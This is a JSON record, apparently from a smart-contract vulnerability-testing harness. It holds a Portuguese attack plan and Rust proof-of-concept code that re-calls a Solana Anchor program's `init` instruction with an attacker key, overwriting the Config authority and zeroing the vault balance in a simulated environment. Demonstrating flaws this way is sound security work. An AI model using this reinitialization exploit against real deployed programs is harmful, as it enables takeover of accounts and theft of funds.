{"plan": "Preparar uma conta Config ja inicializada com authority=legitimo e vault_balance=1000, usando o baseline da instrucao `init` com o authority legitimo como assinante. O ataque chama a mesma instrucao `init` passando a mesma conta Config ja inicializada, mas com a conta do atacante como authority assinante. O efeito medido e que config.authority foi sobrescrito pela chave do atacante e vault_balance foi zerado, demonstrando a reinicializacao nao autorizada.", "scenario": "let config_key = Pubkey::new_unique();
let legit_authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let config_data = anchor_account_data("Config", &(legit_authority, true, 1000u64));
let config_account = account(&env.program_id, &config_data, None);

let baseline_ix = env.anchor_ix("init", &(), vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(legit_authority, true),
]);
let baseline_accounts = vec![
    (config_key, config_account.clone()),
    (legit_authority, wallet(1_000_000_000)),
];
let baseline_result = env.baseline("init legitimo com authority legitimo", &baseline_ix, &baseline_accounts);

let mut attack_accounts: Vec<(Pubkey, AccountSharedData)> = baseline_result.resulting_accounts.clone();
attack_accounts.push((attacker, wallet(1_000_000_000)));

let attack_ix = env.anchor_ix("init", &(), vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(attacker, true),
]);

let attack_result = env.attack("reinit com authority do atacante", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let config_after = after(&attack_result, &config_key);
    let authority_after = read_pubkey(config_after.data(), 8);
    let vault_after = read_u64(config_after.data(), 8 + 32 + 1);
    env.effect("authority sobrescrito pelo atacante", authority_after == attacker);
    env.effect("vault_balance zerado pelo ataque", vault_after == 0);
}
"}

